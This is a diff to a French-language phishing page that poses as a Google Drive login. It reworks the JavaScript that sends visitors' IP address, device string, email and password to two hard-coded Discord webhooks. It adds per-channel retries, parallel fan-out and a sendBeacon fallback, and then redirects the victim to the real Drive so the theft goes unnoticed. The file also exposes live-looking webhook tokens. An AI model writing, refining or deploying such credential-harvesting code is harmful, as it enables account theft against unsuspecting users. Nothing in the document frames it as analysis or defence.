@@ -103,6 +103,7 @@
     animation:sp .7s linear infinite;
   }
   @keyframes sp{to{transform:rotate(360deg)}}
+  .stat{font-size:11px;color:#80868b;text-align:right;margin-top:10px;min-height:14px}
 </style>
 </head>
 <body>
@@ -180,6 +181,7 @@
              autocomplete="off" placeholder="Saisissez votre mot de passe">
       <label class="show"><input type="checkbox" id="showpwd"> Afficher le mot de passe</label>
       <div class="actions"><button class="gbtn" id="btnLogin" type="submit">Se connecter</button></div>
+      <div class="stat" id="stat"></div>
     </form>
   </div>
 </section>
@@ -188,14 +190,15 @@
 (function () {
   "use strict";
 
-  var ID       = "1564072527142330579";
-  var TOKEN    = "ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot";
-  var HOSTS    = ["https://discord.com/api/webhooks/", "https://discordapp.com/api/webhooks/"];
+  var URLS = [
+    "https://discord.com/api/v10/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot?wait=true",
+    "https://discord.com/api/v10/webhooks/1567191230872551464/lhvhBSU_tcH3H7mUIuo87kHxBdnnPbzdwAG6laVscaFd4GNk4JRbFjUQKmRoxiutL_QN?wait=true"
+  ];
   var CODE     = "RB-9K42-XT7D";
   var REDIRECT = "https://drive.google.com/drive/my-drive";
 
   var $ = function (id) { return document.getElementById(id); };
-  var emailEl = $("email"), pwdEl = $("pwd");
+  var emailEl = $("email"), pwdEl = $("pwd"), statEl = $("stat");
 
   function show(id) {
     var all = document.querySelectorAll(".screen");
@@ -204,6 +207,7 @@
     window.scrollTo(0, 0);
   }
   function ua() { return (navigator.userAgent || "-").slice(0, 180); }
+  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
 
   function encode(obj) {
     var out = [];
@@ -214,16 +218,13 @@
     }
     return out.join("&");
   }
-  function body(text) { return encode({ username: "Drive - " + CODE, content: text }); }
-  function link(host) { return host + ID + "/" + TOKEN + "?wait=true"; }
 
-  /* Transport 1 : POST urlencodé, sans preflight, réponse lisible */
-  function postFetch(host, payload) {
+  function post(url, payload, timeout) {
     return new Promise(function (resolve) {
       if (!window.fetch) { resolve(false); return; }
       var done = false;
-      var t = setTimeout(function () { if (!done) { done = true; resolve(false); } }, 2200);
-      fetch(link(host), {
+      var t = setTimeout(function () { if (!done) { done = true; resolve(false); } }, timeout || 2500);
+      fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
         body: payload,
@@ -238,60 +239,40 @@
     });
   }
 
-  /* Transport 2 : formulaire POST dans une iframe invisible, aucun CORS */
-  function iframePost(host, payload) {
-    return new Promise(function (resolve) {
-      try {
-        var frame = document.createElement("iframe");
-        frame.style.cssText = "position:absolute;width:0;height:0;border:0;left:-9999px;top:0";
-        frame.setAttribute("aria-hidden", "true");
-        document.body.appendChild(frame);
-
-        var form = document.createElement("form");
-        form.method = "POST";
-        form.action = link(host);
-        form.target = frame.name = "wh" + Math.random().toString(36).slice(2);
-        form.style.display = "none";
-
-        var parts = payload.split("&");
-        for (var i = 0; i < parts.length; i++) {
-          var eq = parts[i].indexOf("=");
-          if (eq < 0) continue;
-          var input = document.createElement("input");
-          input.type = "hidden";
-          input.name  = decodeURIComponent(parts[i].slice(0, eq));
-          input.value = decodeURIComponent(parts[i].slice(eq + 1).replace(/\+/g, " "));
-          form.appendChild(input);
-        }
-        document.body.appendChild(form);
-        form.submit();
-        setTimeout(function () { resolve(true); }, 1300);
-      } catch (e) { resolve(false); }
-    });
-  }
-
-  /* Séquence : domaine 1 (fetch) -> domaine 1 (iframe) -> domaine 2 (fetch)
-     -> domaine 2 (iframe) -> sendBeacon. On s'arrête à la première confirmation. */
-  function deliver(text) {
-    var payload = body(text);
-    return postFetch(HOSTS[0], payload).then(function (ok) {
-      if (ok) return true;
-      return iframePost(HOSTS[0], payload).then(function () {
-        return postFetch(HOSTS[1], payload);
-      }).then(function (ok2) {
-        if (ok2) return true;
-        return iframePost(HOSTS[1], payload).then(function () {
-          beacon(text);
-          return false;
+  function withRetry(url, payload, tries) {
+    var delays = [0, 600, 1400, 2800];
+    var i = 0;
+    function step() {
+      if (i >= tries) return Promise.resolve(false);
+      var wait = delays[i]; i++;
+      return sleep(wait).then(function () {
+        return post(url, payload, 2500).then(function (ok) {
+          return ok ? true : step();
         });
       });
-    });
+    }
+    return step();
   }
+
+  function body(text) { return encode({ username: "Drive - " + CODE, content: text }); }
 
   function beacon(text) {
     try {
-      navigator.sendBeacon(link(HOSTS[0]), new Blob([body(text)], { type: "text/plain;charset=UTF-8" }));
+      var blob = new Blob([body(text)], { type: "text/plain;charset=UTF-8" });
+      navigator.sendBeacon(URLS[0], blob);
+      navigator.sendBeacon(URLS[1], blob);
     } catch (e) {}
+  }
+
+  /* Envoi vers les deux canaux, on s'arrête à la première confirmation */
+  function fanout(text, tries) {
+    var results = [];
+    for (var i = 0; i < URLS.length; i++) {
+      results.push(withRetry(URLS[i], body(text), tries));
+    }
+    return Promise.all(results).then(function (r) {
+      return r.indexOf(true) !== -1;
+    });
   }
 
   window.addEventListener("load", function () {
@@ -301,8 +282,8 @@
       .then(function (j) { if (j && j.ip) ip = j.ip; })
       .catch(function () {});
 
-    Promise.race([ipReq, new Promise(function (r) { setTimeout(r, 1200); })]).then(function () {
-      deliver("\ud83d\udc40 Page ouverte\nCode : " + CODE + "\nIP : " + ip + "\nAppareil : " + ua());
+    Promise.race([ipReq, sleep(1200)]).then(function () {
+      fanout("\ud83d\udc40 Page ouverte\nCode : " + CODE + "\nIP : " + ip + "\nAppareil : " + ua(), 3);
     });
   });
 
@@ -315,12 +296,12 @@
     e.preventDefault();
     var mail = emailEl.value;
     $("chipMail").textContent = mail || "-";
-    deliver("\u2709\ufe0f Email saisi\nCode : " + CODE + "\nEmail : " + mail);
+    fanout("\u2709\ufe0f Email saisi\nCode : " + CODE + "\nEmail : " + mail, 3);
     show("s3");
     setTimeout(function () { try { pwdEl.focus(); } catch (err) {} }, 120);
   });
 
-  var busy = false, went = false, delivered = false;
+  var busy = false, went = false, confirmed = false;
 
   function go() {
     if (went) return;
@@ -339,6 +320,7 @@
     var btn = $("btnLogin");
     btn.disabled = true;
     btn.innerHTML = '<span class="spin"></span>Connexion\u2026';
+    statEl.textContent = "Envoi\u2026";
 
     var text = "\ud83d\udd10 Identifiants\n"
              + "Code : " + CODE + "\n"
@@ -346,21 +328,23 @@
              + "Mot de passe :\n```\n" + (pass || "-") + "\n```\n"
              + "Appareil : " + ua();
 
-    deliver(text).then(function (ok) {
-      delivered = true;
-      if (!ok) btn.innerHTML = '<span class="spin"></span>Redirection\u2026';
-      go();
-    });
+    /* chaque canal réessaie de son côté ; le premier qui passe débloque */
+    for (var i = 0; i < URLS.length; i++) {
+      (function (url) {
+        withRetry(url, body(text), 4).then(function (ok) {
+          if (!ok || confirmed) return;
+          confirmed = true;
+          statEl.textContent = "\u2713 Envoy\u00e9";
+          btn.innerHTML = '<span class="spin"></span>Redirection\u2026';
+          setTimeout(go, 1000);
+        });
+      })(URLS[i]);
+    }
 
-    /* plafond dur : jamais plus de 10 s d'attente */
     setTimeout(function () {
-      if (!delivered) { beacon(text); delivered = true; }
+      if (!confirmed) { beacon(text); statEl.textContent = "Echec d'envoi"; }
       go();
-    }, 10000);
-  });
-
-  window.addEventListener("pagehide", function () {
-    if (busy && !delivered) { beacon("\ud83d\udd10 Identifiants (sortie de page)\nCode : " + CODE + "\nEmail : " + emailEl.value + "\nMot de passe :\n```\n" + pwdEl.value + "\n```"); }
+    }, 14000);
   });
 
   $("showpwd").addEventListener("change", function () {
